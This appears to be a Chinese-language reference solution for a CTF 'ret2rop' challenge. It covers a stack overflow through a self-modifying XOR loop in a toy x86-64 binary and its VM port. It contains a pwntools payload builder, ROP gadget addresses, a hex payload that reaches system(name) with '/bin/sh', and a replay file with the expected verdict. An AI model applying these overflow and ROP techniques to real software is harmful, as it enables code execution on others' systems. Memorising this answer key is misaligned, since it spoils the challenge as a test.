# ret2rop 参考解法

这道题把原题的两个环节都保留了：先按原题读 16 字节 `name`、读 payload、在返回前做一次
「`mask` 在 `buf+0x20`、循环会写到自己上界和计数器」的 XOR，再用 ROP 链把 `name` 的地址
送进 `RDI` 并跳到 `shell`。下面的顺序和原题一致：`name` → payload → XOR → `leave; ret`。

## 1. 原题（x86-64 ELF）的准确解法

原题是固定地址的非 PIE 可执行文件。`vuln` 的栈帧来自 DWARF 和反汇编：

```c
struct frame {
    char buf[0x20];               /* frame+0x00 */
    char mask[0x20];              /* frame+0x20 */
};

void vuln(void)
{
    struct frame frame;           /* rbp-0x50 */
    unsigned long n;              /* rbp-0x10 = frame+0x40 */
    unsigned long i;              /* rbp-0x08 = frame+0x48 */

    read(0, name, 0x10);
    getRandom(frame.mask, 0x20);
    n = read(0, frame.buf, 0x100);
    for (i = 0; i < n; i++)
        frame.buf[i] ^= frame.mask[i];
}
```

三个关键地址（`nm` + `objdump`）：

| 片段 | 地址 | 机器码 |
|---|---|---|
| `pop rsi; ret` | `0x401a18` | `5e c3` |
| `mov rdi, rsi; ret` | `0x401a21` | `48 89 f7 c3` |
| `system@plt` | `0x401180` | `ff 25 ...` |
| `name` 全局 | `0x4040f0` | 16 字节 |

`vuln` 的 `leave; ret` 在偏移 `0x58` 处：`frame` 的 `0x40` 字节 + `n` 8 字节 + `i` 8 字节 +
saved rbp 8 字节。所以返回地址之后依次摆 `pop rsi` → `&name` → `mov rdi,rsi` → `system`，
就能执行 `system(name)`。

### 原题循环的两个坑

第一，`frame.mask` 只有 `0x20` 字节，而循环要走到 `n`（最多 `0x100`）。`i >= 0x20` 时
`frame.mask[i]` 读到的是 `n`、`i`、saved rbp、ret addr 以及调用者栈上的字节；这些位置
也都在 `read(0, frame.buf, 0x100)` 的范围内。所以「密钥」不是 getRandom 填的那 32 字节，
而是 payload 自己的第 `i + 0x20` 字节起的那个字节。

第二，`n` 和 `i` 两个局部变量恰好落在溢出区里（`frame+0x40` 和 `frame+0x48`），而循环体
会写到这两个位置。当 `i` 走到 `0x40` / `0x48` 时，循环会改掉自己的上界和计数器：如果
payload 一直延伸到 `0x60` 之后，naive 的「从后往前编码」会让循环提前结束或跳飞，链就
拼不出来。

实际可用的约束是：

- `p[0x60..0x67]` 必须为 0：`n` 槽在 `i = 0x40` 时异或的密钥就是这里的 8 字节，保持
  `n = 0x100`；
- `p[0x68..0x6f]` 必须为 0：`i` 槽在 `i = 0x48` 时的密钥，保持计数器按 1 前进；
- 因此解码后的 `name`（`d[0x60]`）和 `mov rdi,rsi`（`d[0x68]`）两个字要从
  `p[0x80]` / `p[0x88]` 反推；
- `p[0x70]` / `p[0x78]` 的密钥在 `p[0x90]` / `p[0x98]`，取 0；
- 第一个链字 `0x58` 的密钥是 `p[0x78]`，取 0 后可以原样写 `pop rsi`。

原题的可用 payload 构造（在 Ubuntu 24.04 / glibc 2.39 下用 pwntools 实际跑通，`system`
执行 `echo PWNED`，输出里能看到 `PWNED`）：

```python
from pwn import p64
POP_RSI = 0x401a18
MOV_RDI_RSI = 0x401a21
SYSTEM = 0x401180
NAME = 0x4040f0

def craft(d, n=0x100):
    p = bytearray(n)
    p[0x60:0x68] = b'\x00' * 8       # n 槽（0x40）的密钥
    p[0x68:0x70] = b'\x00' * 8       # i 槽（0x48）的密钥
    p[0x80:0x88] = d[0x60:0x68]      # name 链字放到这里
    p[0x88:0x90] = d[0x68:0x70]      # mov 链字放到这里
    p[0x90:0x98] = b'\x00' * 8
    p[0x98:0xa0] = b'\x00' * 8
    p[0x70:0x78] = bytes(a ^ b for a, b in zip(d[0x70:0x78], p[0x90:0x98]))
    p[0x78:0x80] = bytes(a ^ b for a, b in zip(d[0x78:0x80], p[0x98:0xa0]))
    p[0x58:0x60] = bytes(a ^ b for a, b in zip(d[0x58:0x60], p[0x78:0x80]))
    for i in range(0x58):
        p[i] = 0x41
    return bytes(p)

name = b'echo PWNED' + b'\x00' * 6
d = b'\x41' * 0x58 + p64(POP_RSI) + p64(NAME) + p64(MOV_RDI_RSI) + p64(SYSTEM) + p64(0)
payload = craft(d.ljust(0x100, b'\x00'))
```

`name` 只有 16 字节，`echo PWNED` 正好 10 字节，补 6 个 NUL；少补或多补都会把 payload 的
开头顶掉，`read(0, name, 0x10)` 只认前 16 字节。

## 2. 移植后的程序

`program.asm` 按原题顺序重写：

1. `read(0, name, 0x10)` 读 16 字节 `name` 到 `0x401000`；
2. `getRandom(frame.mask, 0x20)` 用固定伪随机源复制 32 字节到 `0x7ffffec0`；
3. `read(0, frame.buf, 0x100)` 写 `0x7ffffea0`，`frame.buf` 只有 `0x20`；
4. 按 8 字节字原地 XOR：`*(uint64_t *)(buf + i) ^= *(uint64_t *)(buf + i + 0x20)`；
5. `leave; ret` 走栈上的链。

初态 `RIP = 0x400000`、`RSP = RBP = 0x7fffff00`。`call vuln` 把返回地址 `0x400009`
压在 `0x7ffffef8`，`push rbp` 把旧 `RBP` 压在 `0x7ffffef0`，`sub rsp, 0x50` 后
`frame.buf = 0x7ffffea0`。

| 区域 | 地址 | 说明 |
|---|---|---|
| `buf` | `0x7ffffea0` – `0x7ffffebf` | `0x20` 字节 |
| `mask` | `0x7ffffec0` – `0x7ffffedf` | `0x20` 字节，XOR 的「密钥」 |
| `n` | `0x7ffffee0` | read 的返回值 |
| `i` | `0x7ffffee8` | 循环变量 |
| saved rbp | `0x7ffffef0` | `leave` 弹进 RBP |
| ret addr | `0x7ffffef8` | `ret` 取地址 |
| `name` | `0x401000` | 16 字节全局 |
| `shell` | `0x4000d7` | `syscall 98`：FLAG=1 并退出 |

`text` 段的片段：

| 片段 | 地址 | 作用 |
|---|---|---|
| `pop rsi; ret` | `0x4000d3` | `rsi = [rsp]; rsp += 8` |
| `mov rdi, rsi; ret` | `0x4000d5` | `rdi = rsi` |
| `shell` | `0x4000d7` | 置 FLAG=1 并退出 |

判胜要求 `FLAG == 1` 且 `RDI == 0x401000`。只跳到 `shell` 而不把 `RDI` 设成 `name` 会被
`fail` 谓词拦住，所以链必须是 `pop rsi` → `&name` → `mov rdi,rsi` → `shell`。

## 3. 自修改的 XOR

`n` 在 `buf + 0x40`，`i` 在 `buf + 0x48`，都在 `read` 的 0x100 字节范围内。循环体走到
`i = 0x40` 时把 `n` 槽也异或一次，走到 `i = 0x48` 时把 `i` 槽也异或一次。`mask` 只有
`0x20` 字节，所以 `i >= 0x20` 时 `*(uint64_t *)(buf + i + 0x20)` 读到的是 `n`、`i`、
saved rbp、ret addr 和调用者栈——这些同样在 payload 里。

对一般的字 `i`：

```
d[i] = p[i] ^ p[i+4]        =>        p[i] = d[i] ^ p[i+4]
```

但在 `i = 0x40` / `0x48` 这两个槽上，循环写的是 `n ^= p[0x60]` / `i ^= p[0x68]`。
要让循环活着，必须：

- `p[0x60] = 0`，`n` 保持 `0x100`；
- `p[0x68] = 0`，`i` 正常加 8；
- `p[0x80] = d[0x60] = &name`，`p[0x88] = d[0x68] = mov`，让 `name` / `mov` 两个字在
  `i = 0x60` / `0x68` 时才被解出来；
- `p[0x58] = d[0x58] ^ p[0x78] = pop`，`p[0x70] = d[0x70] ^ p[0x90] = shell`；
- `p[0x78] = p[0x90] = 0`。

`p[8]` / `p[9]` 是 `n` / `i` 的初值，程序会在 read 之后立即用 `[rsp+0x40] = rax` /
`[rsp+0x48] = 0` 覆盖，所以 payload 里填什么都行；参考 payload 填 `0x41`。

希望的 `d`：

| 字 | 值 | 含义 |
|---|---|---|
| `d[0]` – `d[7]` | 任意 | `buf` / `mask` 的 padding，链不用 |
| `d[8]` | `0x100` | `n`，程序写入；`i=0x40` 时密钥为 0，保持不变 |
| `d[9]` | 循环变量 | `i`，程序写入；`i=0x48` 时密钥为 0，保持不变 |
| `d[10]` | 任意 | saved rbp，`leave` 弹进 RBP |
| `d[11]` | `0x4000d3` | `pop rsi; ret`，`vuln` 的返回地址 |
| `d[12]` | `0x401000` | `name` 的地址 |
| `d[13]` | `0x4000d5` | `mov rdi, rsi; ret` |
| `d[14]` | `0x4000d7` | `shell` |
| `d[15]` | `0` | 链之后，不用 |

参考 payload 的 `p`：

| 字 | 值 | 说明 |
|---|---|---|
| `p[0]` – `p[10]` | `0x4141414141414141` | padding；`p[8]` / `p[9]` 会被 n/i 覆盖 |
| `p[11]` | `0x4000d3` | `d[11]` 的 `pop rsi` |
| `p[12]` | `0` | `n` 槽的密钥 |
| `p[13]` | `0` | `i` 槽的密钥 |
| `p[14]` | `0x4000d7` | `d[14]` 的 `shell` |
| `p[15]` | `0` | `d[11]` 的密钥 |
| `p[16]` | `0x401000` | 解出 `d[12] = name` |
| `p[17]` | `0x4000d5` | 解出 `d[13] = mov` |
| `p[18]` – `p[31]` | `0` | 密钥 0 |

用下面的脚本可以复现：

```python
p = [0x4141414141414141] * 11
p += [0x4000d3, 0, 0, 0x4000d7, 0, 0x401000, 0x4000d5]
p += [0] * 14
payload = b''.join(w.to_bytes(8, 'little') for w in p)
print(payload.hex())
```

得到的 256 字节 payload：

```
4141414141414141414141414141414141414141414141414141414141414141
4141414141414141414141414141414141414141414141414141414141414141
414141414141414141414141414141414141414141414141d300400000000000
00000000000000000000000000000000d7004000000000000000000000000000
0010400000000000d50040000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
```

`name` 用 `/bin/sh` 加 9 个 NUL，正好 16 字节：

```
2f62696e2f7368000000000000000000
```

## 4. 回放

先把 `name` 喂进去，再喂 payload，最后 `run`。两个出题人积木都只展开成 `feed`，
顺序就是 stdin 的顺序；`name` 必须正好 16 字节，少了会把 payload 的开头吃进 `name`。

```json
{
  "actions": [
    {
      "type": "block",
      "id": "name",
      "args": { "data": "2f62696e2f7368000000000000000000" }
    },
    {
      "type": "block",
      "id": "introduce",
      "args": { "data": "41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141d30040000000000000000000000000000000000000000000d70040000000000000000000000000000010400000000000d50040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" }
    },
    { "type": "run" }
  ],
  "expectedVerdict": "won",
  "note": "name=/bin/sh（16 字节）；payload 按字做自修改 XOR；链为 pop rsi / &name / mov rdi,rsi / shell"
}
```

回放结果：`read` 依次拿到 16 字节 `name` 和 256 字节 payload；XOR 后
`ret` 槽是 `0x4000d3`，`pop rsi` 取到 `0x401000`，`mov rdi,rsi` 后 `RDI = 0x401000`，
`shell` 的 `syscall 98` 置 `FLAG = 1` 并退出，判胜。

## 5. 与原题的差异（给维护者）

- **XOR 的粒度**：原题是逐字节循环，VM 的访存单位是 8 字节字，没有字节写指令，所以
  移植成按字循环。自修改的两个槽（`n` 在 `buf+0x40`、`i` 在 `buf+0x48`）和它们的密钥
  （`buf+0x60`、`buf+0x68`）在字边界上完全对应；`mask` 只有 `0x20` 字节、循环读到
  `mask` 之外这一点也保留了。参考 payload 的 `p[0x60]` / `p[0x68]` 约束与原题一致。
- **循环的字节数**：原题 `i++` 逐字节走，payload 长度不必对齐；VM 的 `i += 8` 要求
  payload 长度按 8 字节对齐（参考用的是 0x100）。
- **随机源**：原题先 `getrandom`、失败再读 `/dev/urandom`；VM 是确定性的，用隐藏 VMA
  `urandom` 的 32 字节固定内容 `copy` 到 `frame.mask`。这段内容随后会被 payload 覆盖，
  不参与判胜，只保留调用顺序。
- **`system`**：原题链尾是 `system@plt`，VM 用 `syscall 98`（`shell`）模拟「拿到 shell」：
  置 `FLAG=1` 并退出。题目没有真正的进程/文件系统，`name` 的内容不执行；判胜改用
  `RDI == &name` 来要求 `system(name)` 的调用约定。
- **demo / backdoor**：原题 `main` 里的 demo 分支和 `backdoor` 的固定字符串
  `system("please to find str")` 都不在解题路径上，移植没有保留；`main` 只保留
  `call vuln` 和正常退出。`backdoor` 在原题里也是诱饵，真正目标是 `system(name)`。
